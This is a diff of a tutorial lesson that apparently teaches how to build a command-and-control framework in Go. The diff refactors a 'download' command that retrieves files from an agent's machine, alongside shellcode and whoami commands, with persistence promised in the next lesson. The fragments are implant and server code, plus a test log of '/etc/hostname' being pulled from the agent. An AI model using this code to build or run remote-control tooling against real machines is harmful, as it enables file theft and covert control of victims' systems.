@@ -21,8 +21,8 @@ We'll implement a **download command** that:
 
 This demonstrates that adding new capabilities follows a predictable pattern:
 
-1. Create argument types (client and agent)
-2. Add validator and processor on server
+1. Create argument type
+2. Add validator on server (processor only if transformation needed)
 3. Add orchestrator on agent
 4. Add doer on agent
 5. Register the command
@@ -31,9 +31,9 @@ Let's see how quickly we can add a complete new command!
 
 ## What We'll Create
 
-- `DownloadArgsClient` and `DownloadArgsAgent` types in `control/models.go`
+- `DownloadArgs` type in `control/models.go`
 - `DownloadResult` type in `models/results.go`
-- `validateDownloadCommand` and `processDownloadCommand` in `control/download.go`
+- `validateDownloadCommand` in `control/download.go`
 - `orchestrateDownload` in `agent/download.go`
 - Registry updates for the new command
 
@@ -41,22 +41,16 @@ Let's see how quickly we can add a complete new command!
 
 ### Create Argument Types
 
-First, let's define what the client sends and what the agent receives. Add to `control/models.go`:
+For download, the client and agent need identical information - just a file path. Unlike shellcode (where we transform a file path into base64-encoded data), no processing is needed. So we use a single type. Add to `control/models.go`:
 
 ```go
-// DownloadArgsClient - what the client sends (operator requests a file)
-type DownloadArgsClient struct {
-	FilePath string `json:"file_path"` // Path on agent's machine
-}
-
-// DownloadArgsAgent - what we send to the agent (same in this case)
-type DownloadArgsAgent struct {
+// DownloadArgs - arguments for download command (no transformation needed)
+type DownloadArgs struct {
 	FilePath string `json:"file_path"` // Path on agent's machine
 }
 ```
 
-- **DownloadArgsClient** - The operator specifies a file path on the target machine
-- **DownloadArgsAgent** - For download, it's the same as client args (no transformation needed like shellcode)
+- **DownloadArgs** - The operator specifies a file path on the target machine. Since no transformation is needed, we use one type for both client and agent.
 
 Now add the result type to `models/results.go`:
 
@@ -73,7 +67,7 @@ type DownloadResult struct {
 
 - **DownloadResult** - Contains the file data (base64 encoded), size, and success status
 
-### Create Validator and Processor
+### Create Validator
 
 Create `internal/control/download.go`:
 
@@ -84,8 +78,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"log"
-
-	"your-module/internal/models"
 )
 
 // validateDownloadCommand validates "download" command arguments from client
@@ -94,7 +86,7 @@ func validateDownloadCommand(rawArgs json.RawMessage) error {
 		return fmt.Errorf("download command requires arguments")
 	}
 
-	var args models.DownloadArgsClient
+	var args DownloadArgs
 
 	if err := json.Unmarshal(rawArgs, &args); err != nil {
 		return fmt.Errorf("invalid argument format: %w", err)
@@ -107,31 +99,9 @@ func validateDownloadCommand(rawArgs json.RawMessage) error {
 	log.Printf("Download validation passed: file_path=%s", args.FilePath)
 	return nil
 }
-
-// processDownloadCommand processes download arguments (minimal for this command)
-func processDownloadCommand(rawArgs json.RawMessage) (json.RawMessage, error) {
-	var clientArgs models.DownloadArgsClient
-
-	if err := json.Unmarshal(rawArgs, &clientArgs); err != nil {
-		return nil, fmt.Errorf("unmarshaling args: %w", err)
-	}
-
-	// For download, we just pass the file path as-is
-	agentArgs := models.DownloadArgsAgent{
-		FilePath: clientArgs.FilePath,
-	}
-
-	processedJSON, err := json.Marshal(agentArgs)
-	if err != nil {
-		return nil, fmt.Errorf("marshaling processed args: %w", err)
-	}
-
-	log.Printf("Download processed: requesting file %s from agent", clientArgs.FilePath)
-	return processedJSON, nil
-}
 ```
 
-**Note the simplicity:** Unlike shellcode (which needed file reading and base64 encoding on the server), download just passes the path through. The actual file reading happens on the agent.
+**Note:** Unlike shellcode (which needs a processor to read the file and base64-encode it), download doesn't need any transformation - the arguments pass straight through to the agent. When no processing is required, we skip the processor entirely.
 
 ### Register the Command
 
@@ -146,14 +116,14 @@ var validCommands = map[string]struct {
 		Validator: validateShellcodeCommand,
 		Processor: processShellcodeCommand,
 	},
-	"download": {  // NEW
+	"download": {  // NEW - validator only, no processor needed
 		Validator: validateDownloadCommand,
-		Processor: processDownloadCommand,
 	},
+	"whoami": {}, // No arguments needed
 }
 ```
 
-That's it for the server side! Notice how the pattern is identical to shellcode - just different validation and processing logic.
+That's it for the server side! Notice that download only needs a validator - the processor is optional and we skip it when no transformation is required.
 
 ## Part 2: Agent-Side Implementation
 
@@ -182,7 +152,7 @@ import (
 func (agent *HTTPSAgent) orchestrateDownload(job *server.HTTPSResponse) AgentTaskResult {
 
 	// Unmarshal the arguments
-	var downloadArgs control.DownloadArgsAgent
+	var downloadArgs control.DownloadArgs
 	if err := json.Unmarshal(job.Arguments, &downloadArgs); err != nil {
 		errMsg := fmt.Sprintf("Failed to unmarshal DownloadArgs for Task ID %s: %v", job.JobID, err)
 		log.Printf("|ERR DOWNLOAD ORCHESTRATOR| %s", errMsg)
@@ -334,14 +304,14 @@ Look how consistent this is with shellcode:
 
 | Step | Shellcode | Download |
 |------|-----------|----------|
-| 1. Types | ShellcodeArgsClient/Agent | DownloadArgsClient/Agent |
+| 1. Types | ShellcodeArgsClient/Agent (different) | DownloadArgs (single) |
 | 2. Validator | validateShellcodeCommand | validateDownloadCommand |
-| 3. Processor | processShellcodeCommand | processDownloadCommand |
+| 3. Processor | processShellcodeCommand | *none needed* |
 | 4. Orchestrator | orchestrateShellcode | orchestrateDownload |
 | 5. Doer | DoShellcode (interface) | doDownload (simple func) |
 | 6. Register | Add to validCommands | Add to validCommands |
 
-The architecture makes this **predictable and fast**. Adding a new command follows the same pattern every time.
+The key insight: **shellcode needs a processor** because the server transforms arguments (reads file, encodes to base64). **Download doesn't** - the file path passes through unchanged. The architecture supports both patterns elegantly.
 
 ## Test
 
@@ -382,7 +352,6 @@ curl -X POST http://localhost:8080/command \
 ```bash
 2025/11/08 14:22:05 Received command: download
 2025/11/08 14:22:05 Download validation passed: file_path=/etc/hostname
-2025/11/08 14:22:05 Download processed: requesting file /etc/hostname from agent
 2025/11/08 14:22:05 QUEUED: download
 2025/11/08 14:22:08 Endpoint / has been hit by agent
 2025/11/08 14:22:08 DEQUEUED: Command 'download'
@@ -444,14 +413,14 @@ The hard work of building the framework pays dividends with every new capability
 
 In this lesson, we demonstrated framework extensibility:
 
-- Created download argument types (client and agent)
-- Implemented server-side validation and processing
+- Created a single `DownloadArgs` type (no transformation needed)
+- Implemented server-side validation (no processor required)
 - Created the agent-side orchestrator and doer
 - Registered the command in both server and agent
 - Tested the complete flow
-- Understood the consistent pattern for adding commands
+- Understood when to use processors vs. skip them
 
-This "payoff" lesson shows that the architecture we built in previous lessons makes extending the framework fast and predictable.
+This "payoff" lesson shows that the architecture we built in previous lessons makes extending the framework fast and predictable. Commands that need transformation (like shellcode) use processors; commands that don't (like download) can skip them entirely.
 
 In the next (and final) lesson, we'll implement persistence - making the agent survive reboots!
 
